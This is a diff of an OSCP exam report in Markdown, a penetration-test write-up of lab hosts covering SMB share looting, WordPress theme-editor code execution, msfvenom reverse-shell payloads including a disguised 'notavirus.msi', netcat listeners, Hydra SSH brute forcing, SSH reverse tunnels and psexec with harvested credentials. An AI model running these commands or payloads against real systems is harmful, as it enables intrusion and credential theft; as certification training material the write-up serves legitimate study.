@@ -15,6 +15,8 @@ book: true
 classoption: oneside
 code-block-font-size: \scriptsize
 ---
+# OffSec Certified Professional Exam Report
+
 ## Introduction
 
 The OffSec Certified Professional exam report contains all efforts that were conducted in order to pass the OffSec Certified Professional exam. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.
@@ -104,7 +106,7 @@ After the trophies on both the lab network and exam network were completed, John
 
 We run nmap to scan the target and found a few ports open.
 
-```
+```powershell
 └─\$ nmap 192.168.232.55 -p- \--min-rate 20000
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-17 10:28 +04
 Warning: 192.168.232.55 giving up on port because retransmission cap hit (10).
@@ -123,25 +125,28 @@ PORT STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 173.20 seconds
 ```
 
-![](OSCP-Exam-Report-From-DOCX_images/media/image2.png){width="6.138888888888889in" height="2.33125in"}
+![](OSCP-Exam-Report-From-DOCX_images/media/image2.png)
 
-```
+
+```powershell
 └─\$ nmap -sCV 192.168.232.55
 ```
 
-![](OSCP-Exam-Report-From-DOCX_images/media/image3.png){width="5.902777777777778in" height="3.875in"}
+![](OSCP-Exam-Report-From-DOCX_images/media/image3.png)
 
-### **Initial Access -- SMB share to Wordpress RCE**
+
+### Initial Access -- SMB share to Wordpress RCE
 
 SMB revlead a 'Shenzi' share which was not protected with password and has interesting files for us.
 
-```
+```powershell
 └─\$ smbclient -L \\\\\\\\192.168.232.55
 ```
 
-![](OSCP-Exam-Report-From-DOCX_images/media/image4.png){width="5.902777777777778in" height="1.3472222222222223in"}
+![](OSCP-Exam-Report-From-DOCX_images/media/image4.png)
 
-```
+
+```powershell
 └─\$ smbclient \\\\\\\\192.168.232.55\\\\shenzi
 
 Password for \[WORKGROUP\\kali\]:
@@ -161,13 +166,13 @@ xampp-control.ini A 178 Thu May 28 19:45:09 2020
 
 Shenzi share has passwords.txt file, we will download it which can be used for login in wordpress admin account.
 
-```
+```powershell
 └─\$ smb: \\\> get passwords.txt
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image6.png)
 
-```
+```powershell
 └─\$ cat passwords.txt
 ```
 
@@ -175,7 +180,7 @@ Shenzi share has passwords.txt file, we will download it which can be used for l
 
 From all the password admin:FeltHeadwallWight357 looks interesting, We couldn't find any interesting directory with our directory busting enumeration using common wordlists, however if use our Share name it revels a wordpress site.
 
-```
+```powershell
 └─\$ http://192.168.232.55/shenzi/
 ```
 
@@ -183,7 +188,7 @@ From all the password admin:FeltHeadwallWight357 looks interesting, We couldn't 
 
 We used initially discovered credentials admin:FeltHeadwallWight357 from the SMB share to login into wordpress.
 
-```
+```powershell
 └─\$ http://192.168.232.55/shenzi/wp-login.php
 ```
 
@@ -199,7 +204,7 @@ After successfully logged in, we\'ll navigate to Appearance -\> Theme Editor -\>
 
 We generated meterpreter payload with MSF and updated 404.php code with it to get a RCE .
 
-```
+```powershell
 └─\$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.45.154 lport=443 -f raw \> shell.php
 ```
 
@@ -226,7 +231,7 @@ Meanwhile, on our Metasploit console:
 
 Since PHP reverse shells are somewhat unstable, let\'s upload a more stable shell, which we\'ll generate with msfvenom and uploading using meterpreter.
 
-```
+```powershell
 └─\$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=139 -f exe \> shell.exe
 ```
 
@@ -235,13 +240,13 @@ Since PHP reverse shells are somewhat unstable, let\'s upload a more stable shel
 
 On Kali attacking machine:
 
-```
+```powershell
 └─\$ sudo nc -lvp 139
 ```
 
 On Meterpreter session:
 
-```
+```powershell
 meterpreter \> upload shell.exe
 meterpreter \> execute -f shell.exe
 ```
@@ -253,14 +258,14 @@ meterpreter \> execute -f shell.exe
 
 **Local.txt value:**
 
-```
+```powershell
 └─\$ whoami && ipconfig && type local.txt
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image20.png)
 
 
-### **Privilege Escalation - AlwaysInstallElevated**
+### Privilege Escalation - AlwaysInstallElevated
 
 We used PowerUp.ps1 to check the low-hanging fruit and found that system is vulnerable to AlwaysInstallElevated. As Microsoft mentioned, This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
 
@@ -268,13 +273,13 @@ We used PowerUp.ps1 to check the low-hanging fruit and found that system is vuln
 
 - <https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated>
 
-```
+```powershell
 └─\$ python -m http.server 80
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image21.png)
 
-```
+```powershell
 └─\$ iwr http://192.168.45.154/PowerUp.ps1 -o PowerUp.ps1
 ```
 
@@ -283,7 +288,7 @@ We used PowerUp.ps1 to check the low-hanging fruit and found that system is vuln
 
 We'll load the PowerUp.ps1 script into powershell and check for any low-hanging fruit.
 
-```
+```powershell
 PS C:\\Users\\shenzi\\Desktop\> . .\\PowerUp.ps1
 
 PS C:\\Users\\shenzi\\Desktop\> Invoke-AllChecks
@@ -299,7 +304,7 @@ We can also confirm this vulnerability using manual command as suggested by Micr
 
 URL: <https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated>
 
-```
+```powershell
 PS C:\\Users\\shenzi\\Desktop\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
 reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
 HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
@@ -312,41 +317,41 @@ AlwaysInstallElevated REG_DWORD 0x1
 
 We'll generate .msi payload and transfer it to execute on target machine to get elevated shell.
 
-```
+```powershell
 └─\$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi \> notavirus.msi
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image25.png)
 
-```
+```powershell
 └─\$ python -m http.server 80
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image26.png)
 
-```
+```powershell
 └─\$ iwr http://192.168.45.154/notavirus.msi -o notavirus.msi
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image27.png)
 
-```
+```powershell
 └─\$ PS C:\\Users\\shenzi\\Desktop\> msiexec /i notavirus.msi
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image28.png)
 
-```
+```powershell
 └─\$ sudo nc -lvnp 445
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image29.png)
 
-### **Post Exploitation**
+### Post Exploitation
 
 **Proof.txt value:**
 
-```
+```powershell
 c:\\Users\\Administrator\\Desktop\> whoami && ipconfig && type proof.txt
 ```
 
@@ -378,13 +383,14 @@ c:\\Users\\Administrator\\Desktop\> whoami && ipconfig && type proof.txt
 
 **Steps to reproduce the attack:** rom the initial service scan John discovered that this host is called Ajla. After adding the target's IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine's DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.
 
-```
+```powershell
 └─\$ hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
 ```
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image31.png)
 
-### Privilege Escalation -- Sudo group**Vulnerability**
+
+### Privilege Escalation -- Sudo group Vulnerability
 
 **Explanation:** sudo group allows any user in this group to escalate privileges to the root if they know the user's password.
 
@@ -394,7 +400,7 @@ c:\\Users\\Administrator\\Desktop\> whoami && ipconfig && type proof.txt
 
 **Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the "id" command. And knowing user's password, he only needed to use a single command "sudo su" in order to obtain a root shell.
 
-```
+```powershell
 ![](OSCP-Exam-Report-From-DOCX_images/media/image32.png)
 ```
 
@@ -410,7 +416,7 @@ After collecting the proof files and establishing a backdoor using SSH, John beg
 
 John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:
 
-```
+```powershell
 └─\$ ssh-keygen -t rsa -N '' -f \~/.ssh/key
 
 └─\$ ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -I key <kali@192.168.119.164>
@@ -424,13 +430,16 @@ With the dynamic reverse tunnel established, John only needed to edit the /etc/p
 
 **Steps to reproduce the attack:** with the credentials at hand and a reverse tunnel established, John connected to an RDP session using proxychains accepting the certificate when prompted and entering the retrieved password afterward.
 
+```powershell
 └─\$ proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
+```
 
 ### Post-Exploitation
 
 **Local Proof Screenshot:**
 
-![](OSCP-Exam-Report-From-DOCX_images/media/image35.png){width="6.385416666666667in" height="4.914583333333334in"}
+![](OSCP-Exam-Report-From-DOCX_images/media/image35.png)
+
 
 ![](OSCP-Exam-Report-From-DOCX_images/media/image36.png)
 
@@ -444,7 +453,7 @@ John noticed the presence of the Thunderbird program on the user's desktop, and 
 
 **Steps to reproduce the attack:** John was able to reuse a temporary password that the administrator left for Alex.
 
-```
+```powershell
 └─\$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:<UWyBGeTp3Bhw7f@10.5.5.30>
 ```
 
